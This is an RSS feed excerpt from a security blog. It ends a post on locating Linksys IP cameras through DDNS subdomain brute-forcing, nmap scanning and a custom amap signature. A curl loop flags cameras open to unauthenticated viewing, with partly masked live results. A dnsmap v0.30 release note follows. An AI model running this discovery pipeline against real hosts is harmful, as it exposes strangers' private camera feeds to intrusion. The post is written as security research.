<pre><code>$ for i in `cat doms`;do dnsmap $i -w wordlist_TLAs.txt -r ~/ -i 64.14.13.199,216.39.81.84&amp;done;</code></pre><p>NOTE: dnsmap&#39;s <code>-i</code> option allows ignoring user-supplied IP addresses from the results. In this case, 64.14.13.199 and 216.39.81.84 belong to the <a href="http://www.tzo.com/">DDNS service provider</a>, and would therefore be regarded as false positives in this case (we&#39;re only interested in IP cameras setup by their respective owners after all). For more info on how to use dnsmap, checkout the <a href="http://code.google.com/p/dnsmap/source/browse/trunk/README.txt">README</a> file.</p>
<p>We then parse the IP addresses of the subdomains discovered by dnsmap:</p>
<pre><code>$ grep \# dnsmap*.txt | awk &#39;{print $4}&#39; | sort | uniq &gt; ips.txt</code></pre><p>Next, we scan for ports that could potentially be used by a Linksys IP camera web server. In this case, we choose TCP ports 80, 1024 and 1025 as candidates:</p>
<pre><code>$ sudo nmap -v -T4 -n -P0 -sS -p80,1024,1025 -iL ips.txt -oA nmap_http_ports.`date +%Y-%m-%d-%H%M%S`</code></pre><p>This leaves us with a lot of discovered services, but we don&#39;t quite yet know which of them correspond to actual Linksys IP cameras web interfaces. There are many ways to fingreprint the web server of a Linksys IP camera. In this case we chose to create our own <a href="http://freeworld.thc.org/thc-amap/">amap</a> response signature, and then scan the open ports with amap.</p>
<p>Before amap is capable of identifying our target Linksys IP cams, the following response signature needs to be added to <code>appdefs.resp</code>, and amap then needs to be recompiled. Otherwise amap won&#39;t take the new signature into account:</p>
<pre><code>http-linksys-cam::tcp::^HTTP/.*\nServer: thttpd/.*Accept-Ranges: bytes.*WVC</code></pre><p>Please note that the previous amap response signature was only tested against the WVC54GCA and WVC80N Linksys IP camera models. So I&#39;m not sure if it will work against other models. You&#39;ve been warned!</p>
<p>Once recompiled, amap can be used to identify Linksys IP cameras from nmap&#39;s open ports results. </p>
<pre><code>$ amap -i nmap_http_ports.2010-02-22-102001.gnmap -R -S -o amap_results.`date +%Y-%m-%d-%H%M%S`</code></pre><p>We finally parse the IP addresses and open ports for all discovered Linksys IP cameras:</p>
<pre><code>$ grep http-linksys-cam amap_results.2010-02-22-102253 | awk &#39;{print $3}&#39; | cut -d \/ -f1
x.x.167.245:1024
x.x.228.231:1025
x.x.228.231:80
x.x.64.22:80
x.x.206.70:1024
x.x.31.4:1024
x.x.164.28:1024
_[snip]_</code></pre><p>At this point we have accomplished the task of creating a list of Linksys IP cameras without resorting to search engines or scanning random IP addresses. In order to discover more Linksys cameras, a more comprehensive wordlist would need to be used with dnsmap.</p>
<p>Of course, even further automation would be possible. For instance, an attacker may wish to programmatically identify which Linksys cameras from the previous list allowing video viewing to unauthenticated users:</p>
<pre><code class="language-bash">$ amapfile=amap_results.2010-02-22-102253; <span class="keyword">for</span> i <span class="keyword">in</span> `grep http-linksys-cam <span class="variable">$amapfile</span> | awk <span class="string">'{print $3}'</span> | cut -d \/ -f1`;<span class="keyword">do</span> url=<span class="string">"http://<span class="variable">$i</span>/img/main.cgi?next_file=main.htm"</span>; <span class="keyword">if</span> curl --connect-timeout 2 -s -I --url <span class="variable">$url</span> | grep ^<span class="string">"HTTP/1.1 501"</span>&gt;/dev/null;<span class="keyword">then</span> <span class="built_in">echo</span> <span class="variable">$url</span>;<span class="keyword">fi</span>;<span class="keyword">done</span>;
x.x.206.70:1024/img/main.cgi?next_file=main.htm
x.x.105.221:1024/img/main.cgi?next_file=main.htm
x.x.105.221:80/img/main.cgi?next_file=main.htm
x.x.181.195:1024/img/main.cgi?next_file=main.htm
x.x.243.154:1024/img/main.cgi?next_file=main.htm
x.x.243.154:1025/img/main.cgi?next_file=main.htm
x.x.30.196:1025/img/main.cgi?next_file=main.htm
_[snip]_</code></pre>
<p><em>In addition to automatically checking for anonymous video viewing on all cameras found, other tasks such as checking for default credentials (<code>admin</code>/<code>admin</code>) could also be scripted, although this will NOT be included in this post (or any other at GNUCITIZEN).</em></p>

]]></description></item><item><title>Dnsmap v0.30 is now out!</title><link>https://www.gnucitizen.org/blog/dnsmap-v030-is-now-out/</link><pubDate>Sat, 20 Feb 2010 21:08:48 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/dnsmap-v030-is-now-out/</guid><dc:creator>pagvac</dc:creator><description><![CDATA[
<p>After working on <a href="http://dnsmap.googlecode.com/">dnsmap</a> for a few months whenever time allowed, I decided there were enough additional goodies to make version 0.30 a new public release. Let me just say that a lot of the bugs that have been fixed, and features that have been added to this version would not be possible without the feedback from great folks such as <a href="http://www.bothunters.pl">Borys Lacki</a>, <a href="http://7c0.org">Philipp Winter</a> and <a href="http://kinqpinz.info">meathive</a>. Thanks guys, your feedback was highly valuable to me.</p>
<h2 id="new-features">New Features</h2>
<p>Anyways, the following are some of the new features included:</p>
<pre><code>* IPv6 support
* Makefile included
* Delay option (-d) added. This is useful in cases where dnsmap is killing your bandwidth
* Ignore IPs option (-i) added. Useful for domains which cause dnsmap to produce false positives
* Changes made to make dnsmap compatible with OpenDNS
* Disclosure of internal IP addresses (RFC 1918) are reported
* Updated built-in wordlist
* Included a standalone three-letter acronym (TLA) subdomains wordlist
* Domains susceptible to [same site scripting](http://snipurl.com/etbcv) are reported
* Completion time is now displayed to the user
* Mechanism to attempt to bruteforce wildcard-enabled domains
* Unique filename containing timestamp is now created when no specific output filename is supplied by user
* Various minor bugs fixed</code></pre><p>For those who have never used dnsmap, dnsmap is a command line tool originally released in 2006 which helps discover target subdomains and IP ranges during the initial stages of an infrastructure pentest. dnsmap is a passive(ish) discovery tool meant to be used before an actual active attack. It&#39;s an alternative to other discovery techniques such as whois lookups, scanning large IP ranges, etc. Run dnsmap and you should be able spot netblocks of a target organization in a relatively short period of time.</p>
<p>Dnsmap is open source and is known to work on Linux, FreeBSD and Windows using Cygwin, although it has mostly been tested on Linux. The major drawback is lack of multi-threading support, which I&#39;m hoping will be included in the next public release. Life is busy these days, but I&#39;ll try to spend some time on this project when time allows and inspiration is available!</p>

]]></description></item></channel></rss>